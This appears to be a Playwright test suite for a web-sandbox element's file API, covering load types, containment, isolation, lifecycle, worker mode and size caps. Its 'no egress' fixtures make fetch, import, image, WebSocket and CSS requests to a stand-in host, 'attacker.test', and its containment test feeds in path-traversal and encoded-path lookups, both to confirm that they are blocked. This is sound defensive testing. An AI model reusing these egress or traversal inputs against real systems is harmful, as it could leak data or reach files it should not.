import { test, expect, type SandboxDriver, type FileSpec } from './fixture';
import { MAX_TOTAL_BYTES, mimeTypeFor } from '@src/lib/files';

/**
 * Files (ADR-004): the host registers files on the element, every environment build snapshots them
 * into the guest bootstrap, and the guest gets them as blob: URLs created in its own realm, through
 * the global `sandboxFiles`. Each test names the guarantee it proves:
 *   1. every load type works from a file, with the type from the extension table and exact bytes
 *   2. containment: a lookup is exact, and anything else is NOT_FOUND; the host refuses bad paths
 *   3. isolation: one sandbox's files and URLs mean nothing in another, or on the host page
 *   4. no egress: files run under the guest policy; the evidence cannot silently miss a request (T5)
 *   5. lifecycle: files belong to the element, the guest sees the snapshot of its build
 *   6. worker mode builds its own blobs and sandboxFiles
 *   7. size: the cap loads in every engine, one byte more is refused on the host
 */

// The NOT_FOUND refusal exactly as guest code sees it: a plain Error with an own code, and a message
// that names nothing but the code.
const NOT_FOUND = { isError: true, code: 'NOT_FOUND', keys: ['code'], message: '[sandboxFiles] NOT_FOUND: no such file' };

// Guest-side helper source: describes a thrown or rejected value.
const SHAPE = `const shape = (e) => ({ isError: e instanceof Error, code: e && e.code, keys: e && typeof e === 'object' ? Object.keys(e) : null, message: e && e.message });`;

let guestRuns = 0;
/** Runs `body` (an async function body) inside the guest via execute() and returns its JSON result. */
async function inGuest<T = any>(sandbox: SandboxDriver, body: string, timeout = 15000): Promise<T> {
    const tag = `FILES_RESULT_${++guestRuns} `;
    await sandbox.run(`${SHAPE} (async () => { ${body} })().then(
        v => console.log(${JSON.stringify(tag)} + JSON.stringify(v)),
        e => console.log(${JSON.stringify(tag)} + JSON.stringify({ thrown: String(e && e.stack || e) })))`);
    const line = await sandbox.waitForLog(tag, timeout);
    return JSON.parse(line.slice(tag.length));
}

const base64 = (bytes: Uint8Array) => Buffer.from(bytes).toString('base64');
const ALL_BYTES = Uint8Array.from({ length: 256 }, (_, i) => i);

// A 304-byte WOFF2 with one glyph ("A", 4 em wide), the same as in blob-delivery.spec.ts: the width
// tells "font applied" apart from a fallback font.
const FONT_WOFF2_B64 = 'd09GMgABAAAAAAEwAAoAAAAAAowAAADpAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAANAowQgE2AiQDCAsGAAQgBWYHJhvjARAeB7k56pLDFCnWfE6J578/zHP/f1tT6ngFDnWwCAZ8TZYgDTMhaNyqblM8Hs/b4xOfzkgaEQTCoMQRhHx63CIIsOXalgQeGBRwFlAEpwsdDrqxs2Q52OSYo80T9fFdNlCKAjhOccr7FpjfArglGzo2u8GmsoVSgtP/f+383wiABgoNYywCCkSqMljisVm5eLng4osLIAjnu82mHbyOe3+E++ensUcr83aBroHQt/6xMgceIFpe8pWgKQFNi7KfhzFBQDMy0aUmYt2qUWmW7ZyxC3ea/aR+QAK1AsO1QYLjexZS6O57AA==';

const LOAD_FILES: Record<string, FileSpec> = {
    'scripts/classic.js': 'globalThis.__classicRan = (globalThis.__classicRan || 0) + 1;',
    'mod/single.js': "export const v = 'module-ran';",
    'style.css': '#probe { width: 123px; }',
    'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="7" height="9"></svg>',
    'font.woff2': { base64: FONT_WOFF2_B64 },
    'data.json': '{"answer":42,"text":"héllo"}',
    'bytes.bin': { base64: base64(ALL_BYTES) },
};

test.describe('1. every load type works from a registered file', () => {
    test('classic script, import() of a module, stylesheet, SVG image, WOFF2 font, fetch, byte-exact read; each blob carries its table type; no violation', async ({ sandbox }) => {
        expect(await sandbox.registerFiles(LOAD_FILES)).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, `
            const violations = [];
            addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective));
            const r = { list: sandboxFiles.list() };
            r.classic = await new Promise(res => {
                const s = document.createElement('script');
                s.src = sandboxFiles.url('scripts/classic.js');
                s.onload = () => res(globalThis.__classicRan === 1 ? 'ran' : 'loaded-not-run');
                s.onerror = () => res('error');
                document.head.appendChild(s);
            });
            r.module = await import(sandboxFiles.url('mod/single.js')).then(m => m.v, e => 'error:' + e.name);
            document.body.insertAdjacentHTML('beforeend', '<div id="probe"></div><span id="glyph" style="font: 16px probefont, monospace">A</span>');
            r.stylesheet = await new Promise(res => {
                const l = document.createElement('link');
                l.rel = 'stylesheet';
                l.href = sandboxFiles.url('style.css');
                l.onload = () => res(getComputedStyle(document.getElementById('probe')).width);
                l.onerror = () => res('error');
                document.head.appendChild(l);
            });
            r.svg = await new Promise(res => {
                const i = new Image();
                i.onload = () => res(i.naturalWidth + 'x' + i.naturalHeight);
                i.onerror = () => res('error');
                i.src = sandboxFiles.url('logo.svg');
            });
            const style = document.createElement('style');
            style.textContent = '@font-face { font-family: probefont; src: url(' + sandboxFiles.url('font.woff2') + '); }';
            document.head.appendChild(style);
            r.font = await document.fonts.load('16px probefont').then(
                () => document.getElementById('glyph').getBoundingClientRect().width > 50 ? 'applied' : 'fallback', e => 'error:' + e.name);
            r.fetch = await fetch(sandboxFiles.url('data.json')).then(x => x.json());
            r.text = await sandboxFiles.text('data.json');
            const bytes = await sandboxFiles.read('bytes.bin');
            r.read = bytes instanceof Uint8Array && bytes.length === 256 && bytes.every((b, i) => b === i) ? 'exact' : Array.from(bytes).join(',');
            bytes[0] = 7;
            r.freshCopy = (await sandboxFiles.read('bytes.bin'))[0];
            r.types = {};
            for (const path of sandboxFiles.list()) r.types[path] = (await (await fetch(sandboxFiles.url(path))).blob()).type;
            r.urls = sandboxFiles.list().every(p => /^blob:null\\//.test(sandboxFiles.url(p))) ? 'guest-realm' : sandboxFiles.list().map(p => sandboxFiles.url(p));
            r.stableUrl = sandboxFiles.url('logo.svg') === sandboxFiles.url('logo.svg');
            await new Promise(res => setTimeout(res, 100)); // violation events are queued as tasks
            r.violations = violations;
            return r;
        `);

        const paths = Object.keys(LOAD_FILES).sort();
        expect(r).toEqual({
            list: paths,
            classic: 'ran',
            module: 'module-ran',
            stylesheet: '123px',
            svg: '7x9',
            font: 'applied',
            fetch: { answer: 42, text: 'héllo' },
            text: '{"answer":42,"text":"héllo"}',
            read: 'exact',
            freshCopy: 0,
            types: Object.fromEntries(paths.map(p => [p, mimeTypeFor(p)])),
            urls: 'guest-realm',
            stableUrl: true,
            violations: [],
        });
    });

    test('without scriptUnsafe, the first guest script already has sandboxFiles: files exist before any guest markup runs', async ({ sandbox, page }) => {
        await sandbox.exposeHost('report', '(value) => { (window.reports ||= []).push(value); return true; }');
        expect(await sandbox.registerFiles({ 'app.js': "bridge.call('report', 'app.js ran; files: ' + sandboxFiles.list().join(','));" })).toBe('ok');
        expect(await sandbox.mount({ scriptUnsafe: false, html: `<script>
            bridge.call('report', 'first script: ' + typeof sandboxFiles);
            const s = document.createElement('script');
            s.src = sandboxFiles.url('app.js');
            document.head.appendChild(s);
        </script>` })).toBe('ready');
        await page.waitForFunction(() => (window as any).reports?.length === 2);
        expect(await page.evaluate(() => (window as any).reports)).toEqual(['first script: object', 'app.js ran; files: app.js']);
    });
});

// Lookups that must not reach a.js or dir/b.txt: other spellings, traversal, encodings, other types.
const LOOKUP_CORPUS = [
    'A.js', 'a.JS', 'a.js/', './a.js', '../a.js', '/a.js', 'dir/../a.js', '..', '.', '',
    'dir//b.txt', 'dir/./b.txt', '/dir/b.txt', 'dir\\b.txt', 'b.txt', 'dir', 'dir/',
    '%2e%2e/a.js', '%2E%2E/a.js', '..%2fa.js', 'a%2Ejs', 'dir%2Fb.txt',
    'https://vfs.invalid/a.js', '//a.js', 'c:/a.js', 'a.js?x', 'a.js#x', ' a.js', 'a.js ', 'a.js\t', 'a.js\n', 'a.js\u0000',
    '\uFF0E\uFF0E/a.js', 'toString', '__proto__', 'constructor', 'hasOwnProperty', 'valueOf',
];

test.describe('2. containment', () => {
    test('every lookup other than an exact registered path is NOT_FOUND, minted in the guest, for url(), read() and text(); list() is unchanged', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({ 'a.js': 'void 0', 'dir/b.txt': 'b' })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, `
            const corpus = ${JSON.stringify(LOOKUP_CORPUS)};
            // non-strings, and a.js's own blob: URL used as a path
            corpus.push(null, undefined, 42, { toString: () => 'a.js' }, ['a.js'], sandboxFiles.url('a.js'));
            const outcomes = [];
            for (const path of corpus) {
                let url;
                try { sandboxFiles.url(path); url = 'returned'; } catch (e) { url = shape(e); }
                const read = await sandboxFiles.read(path).then(() => 'resolved', shape);
                const text = await sandboxFiles.text(path).then(() => 'resolved', shape);
                outcomes.push({ url, read, text });
            }
            return { outcomes, list: sandboxFiles.list(), exact: await sandboxFiles.text('dir/b.txt') };
        `);
        expect(r.outcomes).toHaveLength(LOOKUP_CORPUS.length + 6);
        for (const outcome of r.outcomes) expect(outcome).toEqual({ url: NOT_FOUND, read: NOT_FOUND, text: NOT_FOUND });
        expect(r.list).toEqual(['a.js', 'dir/b.txt']);
        expect(r.exact).toBe('b');
    });

    test('the host refuses an invalid path with INVALID_PATH and the whole batch changes nothing, on the host or in the next guest', async ({ sandbox, page }) => {
        expect(await sandbox.registerFiles({ 'keep.js': 'void 0' })).toBe('ok');
        const bad = ['../x.js', './x.js', '/x.js', 'a//b.js', 'a/', 'a\\b.js', '%2e%2e/x.js', '..%2fx.js', 'c:/x.js', '//h/x.js', 'https:x.js', 'x?y', 'x#y', 'a\tb', 'a\nb', 'a b', 'a\u0000b', '\uFF0E\uFF0E/x.js', 'x'.repeat(257)];
        for (const path of bad) {
            expect(await sandbox.registerFiles({ 'new.js': 'void 0', [path]: 'x' })).toBe('INVALID_PATH');
        }
        expect(await page.evaluate(() => (document.querySelector('web-sandbox') as any).listFiles())).toEqual([{ path: 'keep.js', type: 'text/javascript', size: 6 }]);
        expect(await sandbox.mount()).toBe('ready');
        expect(await inGuest(sandbox, 'return sandboxFiles.list();')).toEqual(['keep.js']);
    });
});

test.describe('3. isolation between sandboxes and from the host page', () => {
    test("one sandbox's blob: URL loads neither in a second sandbox nor on the host page; each lists only its own files; the guest document carries no host identifier and no <base>", async ({ sandbox, page }) => {
        expect(await sandbox.registerFiles({ 'secret.txt': 'A-secret' })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const a = await inGuest(sandbox, `return {
            url: sandboxFiles.url('secret.txt'),
            list: sandboxFiles.list(),
            base: document.querySelector('base'),
            markup: document.documentElement.outerHTML,
        };`);
        expect(a.url).toMatch(/^blob:null\//);
        expect(a.list).toEqual(['secret.txt']);
        expect(a.base).toBeNull();
        expect(a.markup).not.toContain('localhost');
        expect(a.markup).not.toMatch(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);

        // a second sandbox with files of its own
        expect(await page.evaluate(() => new Promise(resolve => {
            const second = document.createElement('web-sandbox') as any;
            second.id = 'second';
            second.addEventListener('ready', () => resolve('ready'), { once: true });
            second.registerFiles({ 'other.txt': 'B-own' });
            second.setConfig({ capabilities: ['allow-scripts'], scriptUnsafe: true });
            document.body.appendChild(second);
        }))).toBe('ready');
        await page.evaluate((url) => (document.querySelector('#second') as any).execute(`
            const shape = (e) => ({ isError: e instanceof Error, code: e && e.code, keys: e && typeof e === 'object' ? Object.keys(e) : null, message: e && e.message });
            (async () => {
                const r = { list: sandboxFiles.list(), own: await sandboxFiles.text('other.txt') };
                r.fetchOther = await fetch(${JSON.stringify(url)}).then(x => x.text()).then(t => 'loaded:' + t, e => 'error:' + e.name);
                try { sandboxFiles.url('secret.txt'); r.byName = 'returned'; } catch (e) { r.byName = shape(e); }
                r.byUrl = await sandboxFiles.text(${JSON.stringify(url)}).then(() => 'resolved', shape);
                console.log('SECOND ' + JSON.stringify(r));
            })();`), a.url);
        const second = JSON.parse((await sandbox.waitForLog('SECOND ')).slice('SECOND '.length));
        expect(second).toEqual({ list: ['other.txt'], own: 'B-own', fetchOther: 'error:TypeError', byName: NOT_FOUND, byUrl: NOT_FOUND });

        const host = await page.evaluate((url) => fetch(url).then(x => x.text()).then(t => 'loaded:' + t, e => 'error:' + e.name), a.url);
        expect(host).toBe('error:TypeError');
    });
});

test.describe('4. files add no egress', () => {
    const ATTACKER = 'https://attacker.test';
    const EGRESS_FILES: Record<string, FileSpec> = {
        // runs from a blob: URL, so under the guest policy: every channel must be refused
        'egress.js': `globalThis.__egress = (async () => {
            const r = {};
            r.fetch = await fetch('${ATTACKER}/fetch').then(() => 'reached', () => 'refused');
            r.import = await import('${ATTACKER}/import.js').then(() => 'reached', () => 'refused');
            r.img = await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = '${ATTACKER}/img'; });
            r.websocket = await new Promise(res => {
                try { const w = new WebSocket('wss://attacker.test/ws'); w.onopen = () => res('reached'); w.onerror = () => res('refused'); }
                catch (e) { res('refused'); }
            });
            // positive control for the outcome channel: a permitted load reports success
            r.ownFile = await fetch(sandboxFiles.url('egress.js')).then(x => x.ok ? 'reached' : 'refused', () => 'refused');
            return r;
        })();`,
        'import.css': `@import url("${ATTACKER}/import.css");`,
        'background.css': `body { background-image: url("${ATTACKER}/bg.png"); }`,
    };

    test('a file run as script or applied as a stylesheet cannot reach a non-allowlisted origin: each attempt is refused AND reported as a CSP violation', async ({ sandbox, context }) => {
        // Secondary evidence only: in Chromium the route can miss guest requests (backlog T5).
        const routed: string[] = [];
        await context.route(/attacker\.test/, (route) => { routed.push(route.request().url()); return route.fulfill({ body: '' }); });

        expect(await sandbox.registerFiles(EGRESS_FILES)).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const r = await inGuest(sandbox, `
            const violations = [];
            addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
            const sheet = (path) => new Promise(res => {
                const l = document.createElement('link');
                l.rel = 'stylesheet';
                l.href = sandboxFiles.url(path);
                l.onload = () => res('loaded');
                l.onerror = () => res('error');
                document.head.appendChild(l);
            });
            const sheets = { import: await sheet('import.css'), background: await sheet('background.css') };
            const script = await new Promise(res => {
                const s = document.createElement('script');
                s.src = sandboxFiles.url('egress.js');
                s.onload = () => res('loaded');
                s.onerror = () => res('error');
                document.head.appendChild(s);
            });
            const outcomes = await globalThis.__egress;
            await new Promise(res => setTimeout(res, 500)); // violation events are queued as tasks
            return { sheets, script, outcomes, violations: [...new Set(violations)].sort() };
        `);

        // a refused @import fails its whole sheet (an error event) in all three engines; the other sheet loads
        expect(r.sheets).toEqual({ import: 'error', background: 'loaded' });
        expect(r.script).toBe('loaded');
        expect(r.outcomes).toEqual({ fetch: 'refused', import: 'refused', img: 'refused', websocket: 'refused', ownFile: 'reached' });
        // Every refused attempt has its violation, so a request that left and merely failed (DNS, TLS)
        // would show up as a refusal without one and fail this assertion: the evidence cannot miss it.
        expect(r.violations).toEqual([
            `connect-src ${ATTACKER}/fetch`,
            `connect-src wss://attacker.test/ws`,
            `img-src ${ATTACKER}/bg.png`,
            `img-src ${ATTACKER}/img`,
            `script-src-elem ${ATTACKER}/import.js`,
            `style-src-elem ${ATTACKER}/import.css`,
        ]);
        expect(routed).toEqual([]);
    });
});

test.describe('5. lifecycle: files belong to the element, a guest sees the snapshot of its build', () => {
    test('files survive reset(), load() and setConfig(); registering while ready changes nothing until the next build; unregistering takes effect at the next build', async ({ sandbox, page }) => {
        expect(await sandbox.registerFiles({ 'a.js': '1', 'b.txt': 'b' })).toBe('ok');
        expect(await sandbox.mount()).toBe('ready');
        const list = () => inGuest(sandbox, 'return sandboxFiles.list();');
        expect(await list()).toEqual(['a.js', 'b.txt']);

        expect(await sandbox.reset()).toBe('ready');
        expect(await list()).toEqual(['a.js', 'b.txt']);
        expect(await sandbox.load('<p>new markup</p>')).toBe('ready');
        expect(await list()).toEqual(['a.js', 'b.txt']);
        expect(await sandbox.mount({ connectionsAllowed: { 'connect-src': [] } })).toBe('ready');
        expect(await list()).toEqual(['a.js', 'b.txt']);

        // while ready: the running guest keeps its snapshot
        const events = await page.evaluate(() => {
            const s = document.querySelector('web-sandbox') as any;
            const seen: unknown[] = [];
            s.addEventListener('fileschanged', (e: CustomEvent) => seen.push(e.detail));
            s.registerFiles({ 'c.txt': 'c' });
            s.unregisterFiles(['a.js']);
            return seen;
        });
        expect(events).toEqual([{ paths: ['c.txt'] }, { paths: ['a.js'] }]);
        expect(await inGuest(sandbox, `return { list: sandboxFiles.list(), c: await sandboxFiles.text('c.txt').then(() => 'found', shape), a: await sandboxFiles.text('a.js') };`))
            .toEqual({ list: ['a.js', 'b.txt'], c: NOT_FOUND, a: '1' });

        // the next build sees the store as it is now
        expect(await sandbox.reset()).toBe('ready');
        expect(await inGuest(sandbox, `let a; try { sandboxFiles.url('a.js'); a = 'found'; } catch (e) { a = shape(e); } return { list: sandboxFiles.list(), a, c: await sandboxFiles.text('c.txt') };`))
            .toEqual({ list: ['b.txt', 'c.txt'], a: NOT_FOUND, c: 'c' });

        // a terminated sandbox keeps its files for the next build too
        await page.evaluate(() => (document.querySelector('web-sandbox') as any).terminate('test'));
        expect(await sandbox.reset()).toBe('ready');
        expect(await list()).toEqual(['b.txt', 'c.txt']);

        // with every file gone, the API is still there: an empty list, and every lookup NOT_FOUND
        await page.evaluate(() => (document.querySelector('web-sandbox') as any).unregisterFiles());
        expect(await sandbox.reset()).toBe('ready');
        expect(await inGuest(sandbox, `let b; try { sandboxFiles.url('b.txt'); b = 'found'; } catch (e) { b = shape(e); } return { list: sandboxFiles.list(), b, read: await sandboxFiles.read('b.txt').then(() => 'found', shape) };`))
            .toEqual({ list: [], b: NOT_FOUND, read: NOT_FOUND });
    });

    for (const mode of ['iframe', 'worker'] as const) {
        test(`${mode} mode: a guest built without any file has the same API: list() is empty and every lookup is NOT_FOUND`, async ({ sandbox }) => {
            expect(await sandbox.mount({ mode })).toBe('ready');
            expect(await inGuest(sandbox, `
                let url; try { sandboxFiles.url('a.js'); url = 'returned'; } catch (e) { url = shape(e); }
                return { type: typeof sandboxFiles, list: sandboxFiles.list(), url, read: await sandboxFiles.read('a.js').then(() => 'resolved', shape), text: await sandboxFiles.text('a.js').then(() => 'resolved', shape) };
            `)).toEqual({ type: 'object', list: [], url: NOT_FOUND, read: NOT_FOUND, text: NOT_FOUND });
        });
    }
});

test.describe('6. worker mode', () => {
    test('the worker builds its own blobs and sandboxFiles: importScripts, fetch, read and NOT_FOUND all work inside it', async ({ sandbox }) => {
        expect(await sandbox.registerFiles({
            'lib/w.js': 'globalThis.__workerLib = (globalThis.__workerLib || 0) + 1;',
            'data.json': '{"from":"worker"}',
            'bytes.bin': { base64: base64(ALL_BYTES) },
        })).toBe('ok');
        expect(await sandbox.mount({ mode: 'worker' })).toBe('ready');
        const r = await inGuest(sandbox, `
            const r = { scope: typeof document === 'undefined' ? 'worker' : 'document', list: sandboxFiles.list() };
            importScripts(sandboxFiles.url('lib/w.js'));
            r.importScripts = globalThis.__workerLib;
            r.fetch = await fetch(sandboxFiles.url('data.json')).then(x => x.json());
            const bytes = await sandboxFiles.read('bytes.bin');
            r.read = bytes.length === 256 && bytes.every((b, i) => b === i) ? 'exact' : 'wrong';
            r.url = /^blob:null\\//.test(sandboxFiles.url('lib/w.js'));
            try { sandboxFiles.url('../lib/w.js'); r.missing = 'returned'; } catch (e) { r.missing = shape(e); }
            r.missingRead = await sandboxFiles.read('w.js').then(() => 'resolved', shape);
            return r;
        `);
        expect(r).toEqual({
            scope: 'worker',
            list: ['bytes.bin', 'data.json', 'lib/w.js'],
            importScripts: 1,
            fetch: { from: 'worker' },
            read: 'exact',
            url: true,
            missing: NOT_FOUND,
            missingRead: NOT_FOUND,
        });
    });
});

test.describe('7. size: the cap is what every engine loads', () => {
    for (const mode of ['iframe', 'worker'] as const) {
        test(`${mode} mode: files totalling exactly the cap load byte-exact; one byte more is refused on the host with FILES_QUOTA_EXCEEDED`, async ({ sandbox, page }) => {
            test.setTimeout(120000);
            // Pseudo-random bytes (incompressible), generated in the page so 8 MiB never crosses the
            // test protocol; an FNV-1a hash on both sides proves the bytes arrived intact.
            const host = await page.evaluate((total) => {
                const fill = (length: number, seed: number) => {
                    const bytes = new Uint8Array(length);
                    let x = seed;
                    for (let i = 0; i < length; i++) { x ^= x << 13; x ^= x >>> 17; x ^= x << 5; bytes[i] = x & 0xff; }
                    return bytes;
                };
                const fnv = (bytes: Uint8Array) => { let h = 0x811c9dc5; for (const b of bytes) { h ^= b; h = Math.imul(h, 0x01000193) >>> 0; } return h; };
                const small = fill(4096, 7);
                const big = fill(total - small.length, 11);
                const s = document.querySelector('web-sandbox') as any;
                const started = performance.now();
                s.registerFiles({ 'big.bin': big, 'small.bin': small });
                const registerMs = Math.round(performance.now() - started);
                let overCode: unknown = 'no refusal';
                try { s.registerFiles({ 'one-more.bin': new Uint8Array(1) }); } catch (e: any) { overCode = e.code; }
                let growCode: unknown = 'no refusal';
                try { s.registerFiles({ 'small.bin': fill(small.length + 1, 7) }); } catch (e: any) { growCode = e.code; }
                return { hashes: { big: fnv(big), small: fnv(small) }, overCode, growCode, registerMs, files: s.listFiles() };
            }, MAX_TOTAL_BYTES);
            expect(host.overCode).toBe('FILES_QUOTA_EXCEEDED');
            expect(host.growCode).toBe('FILES_QUOTA_EXCEEDED');
            expect(host.files).toEqual([
                { path: 'big.bin', type: 'application/octet-stream', size: MAX_TOTAL_BYTES - 4096 },
                { path: 'small.bin', type: 'application/octet-stream', size: 4096 },
            ]);

            const started = Date.now();
            expect(await sandbox.mount({ mode })).toBe('ready');
            const readyMs = Date.now() - started;
            const guest = await inGuest(sandbox, `
                const fnv = (bytes) => { let h = 0x811c9dc5; for (const b of bytes) { h ^= b; h = Math.imul(h, 0x01000193) >>> 0; } return h; };
                const big = await sandboxFiles.read('big.bin');
                const small = await sandboxFiles.read('small.bin');
                return { sizes: [big.length, small.length], hashes: { big: fnv(big), small: fnv(small) } };
            `, 60000);
            expect(guest).toEqual({ sizes: [MAX_TOTAL_BYTES - 4096, 4096], hashes: host.hashes });
            const srcdocLength = await page.evaluate(() => (document.querySelector('web-sandbox') as any).shadowRoot.querySelector('iframe').srcdoc.length);
            test.info().annotations.push({ type: 'size', description: `${mode}: register ${host.registerMs} ms, ready ${readyMs} ms, wrapper srcdoc ${srcdocLength} chars` });
        });
    }
});
